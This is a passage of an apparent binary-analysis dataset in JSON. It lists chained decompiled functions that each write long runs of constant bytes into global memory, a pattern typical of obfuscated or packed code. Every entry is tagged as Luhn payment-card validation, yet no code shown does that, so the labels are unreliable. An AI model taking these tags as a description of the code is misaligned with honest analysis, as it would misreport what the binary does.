0xc1;\n    *0x4465a6 = 0x1e;\n    *0x4465a7 = 0xc6;\n    *0x4465a8 = 0x96;\n    *0x4465a9 = 0x8a;\n    *0x4465aa = 0x4a;\n    *0x4465ab = 0x40;\n    *0x4465ac = 0x2d;\n    *0x4465ad = 0x98;\n    *0x4465ae = 0x91;\n    *0x4465af = 0x94;\n    *0x4465b0 = 0x9a;\n    *0x4465b1 = 0x98;\n    *0x4465b2 = 0xf3;\n    *0x4465b3 = 0xc0;\n    *0x4465b4 = 0xbf;\n    *0x4465b5 = 0x75;\n    *0x4465b6 = 0xd3;\n    *0x4465b7 = 0x43;\n    *0x4465b8 = 0x22;\n    *0x4465b9 = 0xe5;\n    *0x4465ba = 0x78;\n    *0x4465bb = 0xa2;\n    *0x4465bc = 0x6c;\n    *0x4465bd = 0xdd;\n    return param_1 + iVar1 + 0x162537;\n}\n",
        "token_count": 1251
    },
    "0040be60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040be60(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040bbb0(param_1);\n    *0x44596e = 0xe9;\n    *0x44596f = 0x29;\n    *0x445970 = 0x80;\n    *0x445971 = 0xf9;\n    *0x445972 = 0x4d;\n    *0x445973 = 0x91;\n    *0x445974 = 0x14;\n    *0x445975 = 0x6d;\n    *0x445976 = 0xd1;\n    *0x445977 = 0x1f;\n    *0x445978 = 0x44;\n    *0x445979 = 0xf1;\n    *0x44597a = 0xad;\n    *0x44597b = 0xcc;\n    *0x44597c = 0xd5;\n    *0x44597d = 0x58;\n    *0x44597e = 0x4d;\n    *0x44597f = 0x65;\n    *0x445980 = 0xfa;\n    *0x445981 = 0x8a;\n    *0x445982 = 0xd2;\n    *0x445983 = 0xb;\n    *0x445984 = 0xe0;\n    *0x445985 = 0;\n    *0x445986 = 0x8e;\n    *0x445987 = 0xb4;\n    *0x445988 = 0x23;\n    *0x445989 = 0x4c;\n    *0x44598a = 0x8b;\n    *0x44598b = 0xa9;\n    *0x44598c = 0x57;\n    *0x44598d = 0x8f;\n    *0x44598e = 4;\n    *0x44598f = 6;\n    *0x445990 = 0x80;\n    *0x445991 = 0;\n    *0x445992 = 0xea;\n    *0x445993 = 0x3d;\n    *0x445994 = 0x99;\n    *0x445995 = 0x6c;\n    *0x445996 = 0x61;\n    *0x445997 = 0x93;\n    *0x445998 = 0x11;\n    *0x445999 = 0xb0;\n    *0x44599a = 0x40;\n    *0x44599b = 0xa1;\n    *0x44599c = 0x4a;\n    *0x4465be = 0x90;\n    *0x4465bf = 0xe7;\n    *0x4465c0 = 0xea;\n    *0x4465c1 = 0x17;\n    *0x4465c2 = 0xa8;\n    *0x4465c3 = 0x1d;\n    *0x4465c4 = 0xf;\n    *0x4465c5 = 0x93;\n    *0x4465c6 = 0xb5;\n    *0x4465c7 = 0xd5;\n    *0x4465c8 = 0xf0;\n    *0x4465c9 = 0x13;\n    *0x4465ca = 0x8e;\n    *0x4465cb = 0xa4;\n    *0x4465cc = 0xc6;\n    *0x4465cd = 0x9d;\n    *0x4465ce = 0x6f;\n    *0x4465cf = 0xa3;\n    *0x4465d0 = 0x70;\n    *0x4465d1 = 0xfd;\n    *0x4465d2 = 0x78;\n    *0x4465d3 = 0xed;\n    *0x4465d4 = 0xef;\n    *0x4465d5 = 0x41;\n    *0x4465d6 = 0x2c;\n    *0x4465d7 = 0x25;\n    *0x4465d8 = 0xe8;\n    *0x4465d9 = 0x3b;\n    *0x4465da = 0xf2;\n    *0x4465db = 0xee;\n    *0x4465dc = 0x25;\n    *0x4465dd = 3;\n    *0x4465de = 0x98;\n    *0x4465df = 0x70;\n    *0x4465e0 = 0x14;\n    *0x4465e1 = 0x72;\n    *0x4465e2 = 0xcb;\n    *0x4465e3 = 0xda;\n    *0x4465e4 = 0x46;\n    *0x4465e5 = 0xa7;\n    *0x4465e6 = 0xa0;\n    *0x4465e7 = 0xda;\n    *0x4465e8 = 0xf2;\n    *0x4465e9 = 0x86;\n    *0x4465ea = 0xe;\n    *0x4465eb = 0x27;\n    *0x4465ec = 0x70;\n    return param_1 + iVar1 + 0x13038f;\n}\n",
        "token_count": 1274
    },
    "0040c110": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040c110(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040be60(param_1);\n    *0x44599d = 0x41;\n    *0x44599e = 0x95;\n    *0x44599f = 0xd4;\n    *0x4459a0 = 0x19;\n    *0x4459a1 = 0xa5;\n    *0x4459a2 = 0x1f;\n    *0x4459a3 = 0xed;\n    *0x4459a4 = 0x48;\n    *0x4459a5 = 0xf7;\n    *0x4459a6 = 0xd2;\n    *0x4459a7 = 0x82;\n    *0x4459a8 = 0x17;\n    *0x4459a9 = 0x67;\n    *0x4459aa = 0x56;\n    *0x4459ab = 0x7b;\n    *0x4459ac = 0xb6;\n    *0x4459ad = 0xb7;\n    *0x4459ae = 0x88;\n    *0x4459af = 0x96;\n    *0x4459b0 = 0xcd;\n    *0x4459b1 = 0xbf;\n    *0x4459b2 = 0xf8;\n    *0x4459b3 = 0xe4;\n    *0x4459b4 = 0xf5;\n    *0x4459b5 = 0xea;\n    *0x4459b6 = 0x69;\n    *0x4459b7 = 0x4a;\n    *0x4459b8 = 0x3c;\n    *0x4459b9 = 0xb7;\n    *0x4459ba = 0x55;\n    *0x4459bb = 1;\n    *0x4459bc = 0xa4;\n    *0x4459bd = 0x39;\n    *0x4459be = 0x66;\n    *0x4459bf = 0x16;\n    *0x4459c0 = 0xa4;\n    *0x4459c1 = 0x97;\n    *0x4459c2 = 0xfd;\n    *0x4459c3 = 0xea;\n    *0x4459c4 = 0xa6;\n    *0x4459c5 = 0x8d;\n    *0x4459c6 = 0xaf;\n    *0x4459c7 = 0xb3;\n    *0x4459c8 = 0x88;\n    *0x4459c9 = 0xe9;\n    *0x4459ca = 0xc3;\n    *0x4459cb = 0xf9;\n    *0x4465ed = 0x34;\n    *0x4465ee = 0x71;\n    *0x4465ef = 0xf8;\n    *0x4465f0 = 0xbe;\n    *0x4465f1 = 0x9d;\n    *0x4465f2 = 9;\n    *0x4465f3 = 0x8a;\n    *0x4465f4 = 0xfe;\n    *0x4465f5 = 0xef;\n    *0x4465f6 = 0x79;\n    *0x4465f7 = 0x9d;\n    *0x4465f8 = 0xf6;\n    *0x4465f9 = 0x1c;\n    *0x4465fa = 0x49;\n    *0x4465fb = 0xf7;\n    *0x4465fc = 0x8f;\n    *0x4465fd = 0x5b;\n    *0x4465fe = 100;\n    *0x4465ff = 0xe0;\n    *0x446600 = 0x56;\n    *0x446601 = 0xa7;\n    *0x446602 = 0x9a;\n    *0x446603 = 0xa5;\n    *0x446604 = 0xfe;\n    *0x446605 = 0x3e;\n    *0x446606 = 0x1f;\n    *0x446607 = 0x16;\n    *0x446608 = 0xdc;\n    *0x446609 = 0x24;\n    *0x44660a = 10;\n    *0x44660b = 8;\n    *0x44660c = 0x69;\n    *0x44660d = 0x9e;\n    *0x44660e = 0xd7;\n    *0x44660f = 0xd3;\n    *0x446610 = 0xc4;\n    *0x446611 = 0xb7;\n    *0x446612 = 0xe6;\n    *0x446613 = 0xd4;\n    *0x446614 = 0x2e;\n    *0x446615 = 0xbf;\n    *0x446616 = 0xfa;\n    *0x446617 = 0xec;\n    *0x446618 = 0x8c;\n    *0x446619 = 0xc6;\n    *0x44661a = 0xbb;\n    *0x44661b = 0xff;\n    return param_1 + iVar1 + 0x14df7a;\n}\n",
        "token_count": 1292
    },
    "0040c3c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040c3c0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040c110(param_1);\n    *0x4459cc = 0x1b;\n    *0x4459cd = 0xe;\n    *0x4459ce = 0xb6;\n    *0x4459cf = 0x1a;\n    *0x4459d0 = 0xa7;\n    *0x4459d1 = 0x75;\n    *0x4459d2 = 0xb7;\n    *0x4459d3 = 199;\n    *0x4459d4 = 0x65;\n    *0x4459d5 = 0x27;\n    *0x4459d6 = 0x2b;\n    *0x4459d7 = 0x84;\n    *0x4459d8 = 3;\n    *0x4459d9 = 0x44;\n    *0x4459da = 0x2a;\n    *0x4459db = 0x2c;\n    *0x4459dc = 0x24;\n    *0x4459dd = 0x80;\n    *0x4459de = 0;\n    *0x4459df = 0x6b;\n    *0x4459e0 = 0xdd;\n    *0x4459e1 = 0xa0;\n    *0x4459e2 = 0xad;\n    *0x4459e3 = 0x42;\n    *0x4459e4 = 0x39;\n    *0x4459e5 = 2;\n    *0x4459e6 = 0x66;\n    *0x4459e7 = 0x87;\n    *0x4459e8 = 0xb6;\n    *0x4459e9 = 0x12;\n    *0x4459ea = 0x11;\n    *0x4459eb = 0x62;\n    *0x4459ec = 0xc6;\n    *0x4459ed = 0xd5;\n    *0x4459ee = 0xcd;\n    *0x4459ef = 0xd1;\n    *0x4459f0 = 0x4f;\n    *0x4459f1 = 0x62;\n    *0x4459f2 = 0x67;\n    *0x4459f3 = 0x24;\n    *0x4459f4 = 0x2b;\n    *0x4459f5 = 100;\n    *0x4459f6 = 0xe6;\n    *0x4459f7 = 0x82;\n    *0x4459f8 = 0xa8;\n    *0x4459f9 = 0x99;\n    *0x4459fa = 1;\n    *0x44661c = 0xe8;\n    *0x44661d = 0x25;\n    *0x44661e = 0x34;\n    *0x44661f = 0x77;\n    *0x446620 = 0xf0;\n    *0x446621 = 0xf6;\n    *0x446622 = 0x56;\n    *0x446623 = 0xbf;\n    *0x446624 = 0x76;\n    *0x446625 = 0x97;\n    *0x446626 = 0x72;\n    *0x446627 = 200;\n    *0x446628 = 0xee;\n    *0x446629 = 0x2c;\n    *0x44662a = 0xc3;\n    *0x44662b = 0x87;\n    *0x44662c = 0xf3;\n    *0x44662d = 0x19;\n    *0x44662e = 0xe2;\n    *0x44662f = 0x74;\n    *0x446630 = 0xc3;\n    *0x446631 = 0x8c;\n    *0x446632 = 0x50;\n    *0x446633 = 0xd;\n    *0x446634 = 0xbe;\n    *0x446635 = 0xf1;\n    *0x446636 = 0xf0;\n    *0x446637 = 0x51;\n    *0x446638 = 0xeb;\n    *0x446639 = 0x7b;\n    *0x44663a = 0x8a;\n    *0x44663b = 0x46;\n    *0x44663c = 0x72;\n    *0x44663d = 0xa2;\n    *0x44663e = 0x49;\n    *0x44663f = 0x73;\n    *0x446640 = 0x23;\n    *0x446641 = 0xa0;\n    *0x446642 = 0x3d;\n    *0x446643 = 0x66;\n    *0x446644 = 0xee;\n    *0x446645 = 0xf3;\n    *0x446646 = 0xda;\n    *0x446647 = 0x30;\n    *0x446648 = 0x69;\n    *0x446649 = 0xde;\n    *0x44664a = 0x78;\n    return param_1 + iVar1 + 0x141efb;\n}\n",
        "token_count": 1270
    },
    "0040c670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040c670(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040c3c0(param_1);\n    *0x4459fb = 0x62;\n    *0x4459fc = 9;\n    *0x4459fd = 0x56;\n    *0x4459fe = 0xa3;\n    *0x4459ff = 0x13;\n    *0x445a00 = 3;\n    *0x445a01 = 1;\n    *0x445a02 = 0x6e;\n    *0x445a03 = 0x35;\n    *0x445a04 = 0x41;\n    *0x445a05 = 0x96;\n    *0x445a06 = 0x35;\n    *0x445a07 = 0x3e;\n    *0x445a08 = 0xe1;\n    *0x445a09 = 0x23;\n    *0x445a0a = 0x81;\n    *0x445a0b = 0xf6;\n    *0x445a0c = 0xf5;\n    *0x445a0d = 0x4b;\n    *0x445a0e = 0xd;\n    *0x445a0f = 0xfb;\n    *0x445a10 = 3;\n    *0x445a11 = 0xc6;\n    *0x445a12 = 0x49;\n    *0x445a13 = 0x3d;\n    *0x445a14 = 0x85;\n    *0x445a15 = 0xe0;\n    *0x445a16 = 0xdb;\n    *0x445a17 = 0x83;\n    *0x445a18 = 0x6a;\n    *0x445a19 = 0xf6;\n    *0x445a1a = 0x19;\n    *0x445a1b = 0xe4;\n    *0x445a1c = 0x93;\n    *0x445a1d = 0xfc;\n    *0x445a1e = 0x90;\n    *0x445a1f = 0x4f;\n    *0x445a20 = 0x57;\n    *0x445a21 = 0xf9;\n    *0x445a22 = 0x80;\n    *0x445a23 = 4;\n    *0x445a24 = 0xff;\n    *0x445a25 = 0x89;\n    *0x445a26 = 0x5e;\n    *0x445a27 = 0x18;\n    *0x445a28 = 0x4a;\n    *0x445a29 = 0x5a;\n    *0x44664b = 0xe4;\n    *0x44664c = 0x4e;\n    *0x44664d = 0xe7;\n    *0x44664e = 0xd1;\n    *0x44664f = 0x1c;\n    *0x446650 = 0xf9;\n    *0x446651 = 0x5a;\n    *0x446652 = 0x86;\n    *0x446653 = 0x74;\n    *0x446654 = 0xee;\n    *0x446655 = 0xc5;\n    *0x446656 = 0x9a;\n    *0x446657 = 0xc;\n    *0x446658 = 0x51;\n    *0x446659 = 0x7b;\n    *0x44665a = 0xf5;\n    *0x44665b = 10;\n    *0x44665c = 0x6d;\n    *0x44665d = 0x11;\n    *0x44665e = 0xe2;\n    *0x44665f = 0x16;\n    *0x446660 = 0x2e;\n    *0x446661 = 0xe3;\n    *0x446662 = 0x91;\n    *0x446663 = 0xdc;\n    *0x446664 = 0xa6;\n    *0x446665 = 0x90;\n    *0x446666 = 0x96;\n    *0x446667 = 0x8e;\n    *0x446668 = 0x8c;\n    *0x446669 = 0x7a;\n    *0x44666a = 0x69;\n    *0x44666b = 0x60;\n    *0x44666c = 0xb8;\n    *0x44666d = 0x47;\n    *0x44666e = 0xe4;\n    *0x44666f = 10;\n    *0x446670 = 0xa8;\n    *0x446671 = 99;\n    *0x446672 = 200;\n    *0x446673 = 0x49;\n    *0x446674 = 0xff;\n    *0x446675 = 0x7c;\n    *0x446676 = 0x38;\n    *0x446677 = 0x5e;\n    *0x446678 = 1;\n    *0x446679 = 4;\n    return param_1 + iVar1 + 0x1583dd;\n}\n",
        "token_count": 1255
    },
    "0040ce70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040ce70(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040cbd0(param_1);\n    *0x445a88 = 0x73;\n    *0x445a89 = 0x6d;\n    *0x445a8a = 0x8b;\n    *0x445a8b = 0xf7;\n    *0x445a8c = 0xe8;\n    *0x445a8d = 0xfc;\n    *0x445a8e = 0xa9;\n    *0x445a8f = 0x23;\n    *0x445a90 = 0x5b;\n    *0x445a91 = 1;\n    *0x445a92 = 0xbc;\n    *0x445a93 = 0xf2;\n    *0x445a94 = 0xc5;\n    *0x445a95 = 0x47;\n    *0x445a96 = 0xe8;\n    *0x445a97 = 0xa7;\n    *0x445a98 = 0x97;\n    *0x445a99 = 0xaf;\n    *0x445a9a = 5;\n    *0x445a9b = 0xdc;\n    *0x445a9c = 0x30;\n    *0x445a9d = 0xab;\n    *0x445a9e = 0x1f;\n    *0x445a9f = 0xfe;\n    *0x445aa0 = 0x68;\n    *0x445aa1 = 0xc2;\n    *0x445aa2 = 0xf6;\n    *0x445aa3 = 0xcf;\n    *0x445aa4 = 9;\n    *0x445aa5 = 0xf;\n    *0x445aa6 = 0x7e;\n    *0x445aa7 = 0xe3;\n    *0x445aa8 = 0x51;\n    *0x445aa9 = 0xc2;\n    *0x445aaa = 0x60;\n    *0x445aab = 0x24;\n    *0x445aac = 0x72;\n    *0x445aad = 0x9e;\n    *0x445aae = 0x77;\n    *0x445aaf = 0x4e;\n    *0x445ab0 = 0x12;\n    *0x445ab1 = 0x79;\n    *0x445ab2 = 0x54;\n    *0x445ab3 = 0x73;\n    *0x445ab4 = 0xcb;\n    *0x445ab5 = 0xbf;\n    *0x445ab6 = 0xbb;\n    *0x4466d8 = 0x3f;\n    *0x4466d9 = 0x5e;\n    *0x4466da = 0xbb;\n    *0x4466db = 0xb;\n    *0x4466dc = 0xb9;\n    *0x4466dd = 0x44;\n    *0x4466de = 0x70;\n    *0x4466df = 0x20;\n    *0x4466e0 = 0xcc;\n    *0x4466e1 = 0xf9;\n    *0x4466e2 = 0x1c;\n    *0x4466e3 = 0xc3;\n    *0x4466e4 = 0xb;\n    *0x4466e5 = 0x9d;\n    *0x4466e6 = 0xd1;\n    *0x4466e7 = 0xa6;\n    *0x4466e8 = 0xaa;\n    *0x4466e9 = 0x12;\n    *0x4466ea = 0x87;\n    *0x4466eb = 0x7d;\n    *0x4466ec = 4;\n    *0x4466ed = 0x7e;\n    *0x4466ee = 0x9b;\n    *0x4466ef = 0x80;\n    *0x4466f0 = 0x17;\n    *0x4466f1 = 0xcd;\n    *0x4466f2 = 0x4b;\n    *0x4466f3 = 0xec;\n    *0x4466f4 = 3;\n    *0x4466f5 = 0x2d;\n    *0x4466f6 = 0x3b;\n    *0x4466f7 = 0x82;\n    *0x4466f8 = 0x8f;\n    *0x4466f9 = 0x90;\n    *0x4466fa = 0xf3;\n    *0x4466fb = 6;\n    *0x4466fc = 0xa4;\n    *0x4466fd = 0x2e;\n    *0x4466fe = 0x5f;\n    *0x4466ff = 0xc2;\n    *0x446700 = 0xd0;\n    *0x446701 = 0;\n    *0x446702 = 0x4d;\n    *0x446703 = 0;\n    *0x446704 = 0xc4;\n    *0x446705 = 0x46;\n    *0x446706 = 0xf2;\n    return param_1 + iVar1 + 0x151249;\n}\n",
        "token_count": 1290
    },
    "0040d130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040d130(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040ce70(param_1);\n    *0x445ab7 = 0x78;\n    *0x445ab8 = 0xab;\n    *0x445ab9 = 0xef;\n    *0x445aba = 0x23;\n    *0x445abb = 0x96;\n    *0x445abc = 0xb5;\n    *0x445abd = 0x1d;\n    *0x445abe = 0x3a;\n    *0x445abf = 0xda;\n    *0x445ac0 = 0x5e;\n    *0x445ac1 = 0x6e;\n    *0x445ac2 = 0x5f;\n    *0x445ac3 = 0xa6;\n    *0x445ac4 = 0x11;\n    *0x445ac5 = 0x9f;\n    *0x445ac6 = 0x26;\n    *0x445ac7 = 0x2e;\n    *0x445ac8 = 0xac;\n    *0x445ac9 = 0x7e;\n    *0x445aca = 0xd7;\n    *0x445acb = 0xfb;\n    *0x445acc = 1;\n    *0x445acd = 0x6f;\n    *0x445ace = 0xef;\n    *0x445acf = 0x6b;\n    *0x445ad0 = 0x56;\n    *0x445ad1 = 0xe9;\n    *0x445ad2 = 0x9d;\n    *0x445ad3 = 0x2f;\n    *0x445ad4 = 0xe5;\n    *0x445ad5 = 0xf7;\n    *0x445ad6 = 0x47;\n    *0x445ad7 = 0xcc;\n    *0x445ad8 = 0x5c;\n    *0x445ad9 = 0xb7;\n    *0x445ada = 3;\n    *0x445adb = 0x1b;\n    *0x445adc = 0x5e;\n    *0x445add = 0xde;\n    *0x445ade = 0x1e;\n    *0x445adf = 0xc9;\n    *0x445ae0 = 1;\n    *0x445ae1 = 0x32;\n    *0x445ae2 = 0x98;\n    *0x445ae3 = 0xd8;\n    *0x445ae4 = 0x4e;\n    *0x445ae5 = 0xe;\n    *0x446707 = 0x94;\n    *0x446708 = 0xd6;\n    *0x446709 = 1;\n    *0x44670a = 0x66;\n    *0x44670b = 0x4f;\n    *0x44670c = 0x80;\n    *0x44670d = 0x7a;\n    *0x44670e = 0x23;\n    *0x44670f = 0x8d;\n    *0x446710 = 0xdf;\n    *0x446711 = 0xb9;\n    *0x446712 = 0x8a;\n    *0x446713 = 0xa8;\n    *0x446714 = 0x35;\n    *0x446715 = 0xf;\n    *0x446716 = 0x5e;\n    *0x446717 = 0x83;\n    *0x446718 = 0x68;\n    *0x446719 = 0x8d;\n    *0x44671a = 0x48;\n    *0x44671b = 0;\n    *0x44671c = 0x80;\n    *0x44671d = 0x8a;\n    *0x44671e = 0x51;\n    *0x44671f = 0x8a;\n    *0x446720 = 0x2c;\n    *0x446721 = 0x21;\n    *0x446722 = 0x6b;\n    *0x446723 = 0x8c;\n    *0x446724 = 0x3e;\n    *0x446725 = 0xb1;\n    *0x446726 = 0xe8;\n    *0x446727 = 0xf7;\n    *0x446728 = 0x2b;\n    *0x446729 = 0x5b;\n    *0x44672a = 0;\n    *0x44672b = 0xc1;\n    *0x44672c = 0x8c;\n    *0x44672d = 0x87;\n    *0x44672e = 0x50;\n    *0x44672f = 0x60;\n    *0x446730 = 0xa0;\n    *0x446731 = 0x60;\n    *0x446732 = 0x56;\n    *0x446733 = 0x53;\n    *0x446734 = 199;\n    *0x446735 = 0x53;\n    return param_1 + iVar1 + 0x143c68;\n}\n",
        "token_count": 1242
    },
    "0040d3d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040d3d0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040d130(param_1);\n    *0x445ae6 = 0xa6;\n    *0x445ae7 = 0x1c;\n    *0x445ae8 = 0xc4;\n    *0x445ae9 = 0xe2;\n    *0x445aea = 0x2f;\n    *0x445aeb = 0xbe;\n    *0x445aec = 0xd5;\n    *0x445aed = 0xb0;\n    *0x445aee = 0x50;\n    *0x445aef = 0xbc;\n    *0x445af0 = 0x67;\n    *0x445af1 = 0x90;\n    *0x445af2 = 0xd8;\n    *0x445af3 = 0x67;\n    *0x445af4 = 0x55;\n    *0x445af5 = 0x2d;\n    *0x445af6 = 0xcc;\n    *0x445af7 = 0xe4;\n    *0x445af8 = 0xeb;\n    *0x445af9 = 0x46;\n    *0x445afa = 0xe4;\n    *0x445afb = 0xac;\n    *0x445afc = 0x6d;\n    *0x445afd = 0x2e;\n    *0x445afe = 0xb;\n    *0x445aff = 0xc;\n    *0x445b00 = 0x91;\n    *0x445b01 = 0x4d;\n    *0x445b02 = 0xe3;\n    *0x445b03 = 0xa5;\n    *0x445b04 = 0;\n    *0x445b05 = 0x9c;\n    *0x445b06 = 0x40;\n    *0x445b07 = 0xed;\n    *0x445b08 = 0xda;\n    *0x445b09 = 0x2c;\n    *0x445b0a = 0xa8;\n    *0x445b0b = 0xac;\n    *0x445b0c = 0x2f;\n    *0x445b0d = 0xa0;\n    *0x445b0e = 0xda;\n    *0x445b0f = 0x80;\n    *0x445b10 = 0x86;\n    *0x445b11 = 0xaf;\n    *0x445b12 = 0x43;\n    *0x445b13 = 0x5a;\n    *0x445b14 = 0x59;\n    *0x446736 = 0xf6;\n    *0x446737 = 0x9a;\n    *0x446738 = 8;\n    *0x446739 = 0x94;\n    *0x44673a = 0xf8;\n    *0x44673b = 0x38;\n    *0x44673c = 0x8c;\n    *0x44673d = 0x99;\n    *0x44673e = 0x88;\n    *0x44673f = 0xb8;\n    *0x446740 = 0x21;\n    *0x446741 = 0x9d;\n    *0x446742 = 0xb4;\n    *0x446743 = 0xa6;\n    *0x446744 = 0xb8;\n    *0x446745 = 0x1e;\n    *0x446746 = 0xf2;\n    *0x446747 = 0x11;\n    *0x446748 = 0xe7;\n    *0x446749 = 0x5f;\n    *0x44674a = 0x97;\n    *0x44674b = 0x10;\n    *0x44674c = 0x68;\n    *0x44674d = 0xe7;\n    *0x44674e = 0x61;\n    *0x44674f = 0x3a;\n    *0x446750 = 0x98;\n    *0x446751 = 1;\n    *0x446752 = 0xee;\n    *0x446753 = 0x2c;\n    *0x446754 = 0xf9;\n    *0x446755 = 0x3a;\n    *0x446756 = 0x42;\n    *0x446757 = 7;\n    *0x446758 = 0xb1;\n    *0x446759 = 0xe5;\n    *0x44675a = 0x45;\n    *0x44675b = 0xef;\n    *0x44675c = 8;\n    *0x44675d = 0x9a;\n    *0x44675e = 0x43;\n    *0x44675f = 0x8d;\n    *0x446760 = 0xee;\n    *0x446761 = 0xb3;\n    *0x446762 = 0x6a;\n    *0x446763 = 0x8e;\n    *0x446764 = 0x73;\n    return param_1 + iVar1 + 0x14884f;\n}\n",
        "token_count": 1248
    },
    "0040d910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040d910(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040d670(param_1);\n    *0x445b44 = 0xc5;\n    *0x445b45 = 0x16;\n    *0x445b46 = 0xbf;\n    *0x445b47 = 0x39;\n    *0x445b48 = 0xfc;\n    *0x445b49 = 0x77;\n    *0x445b4a = 0xff;\n    *0x445b4b = 10;\n    *0x445b4c = 0x72;\n    *0x445b4d = 0x8e;\n    *0x445b4e = 0x69;\n    *0x445b4f = 0x62;\n    *0x445b50 = 0xeb;\n    *0x445b51 = 0x51;\n    *0x445b52 = 0xaf;\n    *0x445b53 = 0x72;\n    *0x445b54 = 0x23;\n    *0x445b55 = 0x4c;\n    *0x445b56 = 0xb2;\n    *0x445b57 = 0x3e;\n    *0x445b58 = 0x47;\n    *0x445b59 = 0x1f;\n    *0x445b5a = 0xd;\n    *0x445b5b = 0x21;\n    *0x445b5c = 0x7a;\n    *0x445b5d = 0xfb;\n    *0x445b5e = 0x8b;\n    *0x445b5f = 0x47;\n    *0x445b60 = 0x51;\n    *0x445b61 = 0x28;\n    *0x445b62 = 0xac;\n    *0x445b63 = 0x31;\n    *0x445b64 = 0x57;\n    *0x445b65 = 0x82;\n    *0x445b66 = 0x24;\n    *0x445b67 = 0x34;\n    *0x445b68 = 0x89;\n    *0x445b69 = 0xf8;\n    *0x445b6a = 0x5c;\n    *0x445b6b = 0xfa;\n    *0x445b6c = 0xdb;\n    *0x445b6d = 0xc;\n    *0x445b6e = 0xef;\n    *0x445b6f = 0;\n    *0x445b70 = 0xb2;\n    *0x445b71 = 0x55;\n    *0x445b72 = 0x2e;\n    *0x446794 = 0x3f;\n    *0x446795 = 0xed;\n    *0x446796 = 0xf7;\n    *0x446797 = 0xe4;\n    *0x446798 = 0x1b;\n    *0x446799 = 0x66;\n    *0x44679a = 0xb4;\n    *0x44679b = 0xd7;\n    *0x44679c = 0x52;\n    *0x44679d = 0x73;\n    *0x44679e = 0x45;\n    *0x44679f = 0x29;\n    *0x4467a0 = 0x10;\n    *0x4467a1 = 0xad;\n    *0x4467a2 = 0x1b;\n    *0x4467a3 = 0xc9;\n    *0x4467a4 = 0xa8;\n    *0x4467a5 = 0xf4;\n    *0x4467a6 = 8;\n    *0x4467a7 = 0x25;\n    *0x4467a8 = 0xf;\n    *0x4467a9 = 0xe9;\n    *0x4467aa = 0xc5;\n    *0x4467ab = 0xb4;\n    *0x4467ac = 0x5e;\n    *0x4467ad = 0x74;\n    *0x4467ae = 0x6d;\n    *0x4467af = 0x6c;\n    *0x4467b0 = 0x54;\n    *0x4467b1 = 0x40;\n    *0x4467b2 = 0xff;\n    *0x4467b3 = 0x4c;\n    *0x4467b4 = 0xd2;\n    *0x4467b5 = 0x3a;\n    *0x4467b6 = 0xdf;\n    *0x4467b7 = 0xd4;\n    *0x4467b8 = 0x5d;\n    *0x4467b9 = 0x16;\n    *0x4467ba = 0x55;\n    *0x4467bb = 0x88;\n    *0x4467bc = 0x9f;\n    *0x4467bd = 0xcb;\n    *0x4467be = 0xd;\n    *0x4467bf = 0x71;\n    *0x4467c0 = 0xe6;\n    *0x4467c1 = 0x12;\n    *0x4467c2 = 0x96;\n    return param_1 + iVar1 + 0x14a5c1;\n}\n",
        "token_count": 1311
    },
    "0040dc00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040dc00(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040d910(param_1);\n    *0x445b73 = 0x17;\n    *0x445b74 = 0x68;\n    *0x445b75 = 0;\n    *0x445b76 = 0x9d;\n    *0x445b77 = 0xe3;\n    *0x445b78 = 0xcb;\n    *0x445b79 = 0x4b;\n    *0x445b7a = 0x73;\n    *0x445b7b = 0x5f;\n    *0x445b7c = 0x9d;\n    *0x445b7d = 8;\n    *0x445b7e = 0x1e;\n    *0x445b7f = 0x56;\n    *0x445b80 = 0x16;\n    *0x445b81 = 0x20;\n    *0x445b82 = 0xbc;\n    *0x445b83 = 0xeb;\n    *0x445b84 = 0x5e;\n    *0x445b85 = 0xd;\n    *0x445b86 = 0xa3;\n    *0x445b87 = 0x13;\n    *0x445b88 = 0x14;\n    *0x445b89 = 0x5f;\n    *0x445b8a = 0xda;\n    *0x445b8b = 0x16;\n    *0x445b8c = 0xc9;\n    *0x445b8d = 0x39;\n    *0x445b8e = 0x9e;\n    *0x445b8f = 0x11;\n    *0x445b90 = 0x85;\n    *0x445b91 = 0xd1;\n    *0x445b92 = 0xdf;\n    *0x445b93 = 0x77;\n    *0x445b94 = 0x41;\n    *0x445b95 = 0xf3;\n    *0x445b96 = 0xc0;\n    *0x445b97 = 0x8b;\n    *0x445b98 = 0x6c;\n    *0x445b99 = 0x7e;\n    *0x445b9a = 0x1a;\n    *0x445b9b = 0xe7;\n    *0x445b9c = 0x67;\n    *0x445b9d = 0xe5;\n    *0x445b9e = 0xf9;\n    *0x445b9f = 